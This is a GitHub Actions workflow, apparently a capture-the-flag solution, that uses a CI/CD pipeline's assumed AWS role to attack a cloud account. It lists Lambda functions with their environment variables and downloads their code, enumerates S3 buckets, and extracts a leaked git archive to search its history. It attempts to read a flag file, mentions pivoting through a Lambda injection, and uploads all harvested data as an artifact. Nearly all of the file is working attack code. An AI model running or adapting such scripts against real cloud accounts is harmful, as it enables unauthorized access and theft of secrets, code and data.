name: CTF Lambda and S3 Discovery

on:
  workflow_dispatch:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  discover:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1
          role-session-name: ctf-discovery

      - name: List Lambda functions
        run: |
          set -euo pipefail

          mkdir -p discovery

          aws lambda list-functions \
            --region us-east-1 \
            --query 'Functions[].{
              name:FunctionName,
              runtime:Runtime,
              handler:Handler,
              description:Description,
              env:Environment
            }' \
            --output json \
            > discovery/lambda.json

          cat discovery/lambda.json

      - name: Fetch Lambda configurations and code
        run: |
          set -euo pipefail

          mkdir -p discovery/lambda-code

          for fn in $(jq -r '.[].name' discovery/lambda.json); do
            safe="$(printf '%s' "$fn" | tr -c 'a-zA-Z0-9' '_')"

            echo "=== $fn ==="

            aws lambda get-function \
              --region us-east-1 \
              --function-name "$fn" \
              --output json \
              > "discovery/$safe.describe.json" || true

            aws lambda get-function-configuration \
              --region us-east-1 \
              --function-name "$fn" \
              --output json \
              > "discovery/$safe.config.json" || true

            code_url="$(
              jq -r '.Code.Location // empty' \
                "discovery/$safe.describe.json" 2>/dev/null || true
            )"

            if [ -n "$code_url" ]; then
              curl -sS -L "$code_url" \
                -o "discovery/lambda-$safe.zip" || true
              unzip -q -o \
                "discovery/lambda-$safe.zip" \
                -d "discovery/lambda-$safe" || true
              echo "--- $fn directory ---"
              ls -la "discovery/lambda-$safe" || true
            fi
          done

      - name: List S3 buckets
        run: |
          set -euo pipefail

          aws s3api list-buckets \
            --query 'Buckets[].Name' \
            --output json > discovery/buckets.json

          cat discovery/buckets.json

      - name: List origin bucket contents
        run: |
          set -u

          bucket="site781fe43f26b9eba3"

          aws s3api list-objects-v2 \
            --bucket "$bucket" \
            --query 'Contents[].{
              key:Key,
              size:Size,
              etag:ETag,
              lastModified:LastModified
            }' \
            --output json || true

      - name: List other buckets
        run: |
          for bucket in \
            codec4f26c862a321ef5 \
            platform-bucket-009661764077-us-east-1
          do
            echo "=== $bucket ==="
            aws s3api list-objects-v2 \
              --bucket "$bucket" \
              --query 'Contents[].{Key:Key,Size:Size,ETag:ETag}' \
              --output json || true

            echo "--- policy status ---"
            aws s3api get-bucket-policy-status \
              --bucket "$bucket" \
              --query 'PolicyStatus.IsPublic' \
              --output text || true
          done

      - name: Extract and Analyze Git History
        run: |
          set -euo pipefail

          mkdir -p git-analysis
          cd git-analysis

          # Download from the public platform bucket
          aws s3 cp s3://platform-bucket-009661764077-us-east-1/dotgit.zip dotgit.zip

          # Unzip the git bundle
          unzip dotgit.zip

          # If it unpacked directly as a .git directory, initialize a working tree
          if [ -d ".git" ]; then
            echo "Found .git folder, checking out master/main..."
            git checkout -f || git checkout -b main || true
          fi

          echo "=== Git Log ==="
          git log --oneline -n 50 || true

          echo "=== Git Reflog ==="
          git reflog || true

          echo "=== Show Files in Repo ==="
          find . -maxdepth 4 -not -path '*/.*'

          echo "=== Inspecting Commits ==="
          # Search commit history for keywords
          git log -S "nslookup" --oneline || true
          git log -S "api" --oneline || true

          # Show details of the latest 3 commits
          git show HEAD || true
          git show HEAD~1 || true

      - name: Inspect nslookupv2 configuration
        run: |
          set -euo pipefail

          # Get policy to see what triggers it (e.g. API Gateway, S3, etc.)
          aws lambda get-policy \
            --function-name nslookupv2 \
            --region us-east-1 \
            --output json > nslookupv2-policy.json || true
          cat nslookupv2-policy.json || true

          # Check if there is an active Function URL (Direct HTTPS endpoint)
          aws lambda list-function-url-configs \
            --function-name nslookupv2 \
            --region us-east-1 \
            --output json > nslookupv2-urls.json || true
          cat nslookupv2-urls.json || true

      - name: Direct Flag Access Attempt
        run: |
          set -u
          aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt || true
          if [ -f /tmp/flag.txt ]; then
            echo "=== DIRECT FLAG ACCESS SUCCESSFUL ==="
            cat /tmp/flag.txt
          else
            echo "Direct access denied. We must pivot through the Lambda injection."
          fi

      - name: Fetch CloudFront details
        run: |
          set -euo pipefail

          aws cloudfront get-distribution \
            --id EKD9KH16RB5G3 \
            --query 'Distribution.{
              config:DistributionConfig,
              orig:DistributionConfig.Origins.Items,
              aliases:DistributionConfig.Aliases.Items,
              defaultCache:DistributionConfig.DefaultCacheBehavior
            }' \
            --output json \
            > discovery/cloudfront.json || true

          cat discovery/cloudfront.json || true

      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: ctf-lambda-s3
          path: discovery/
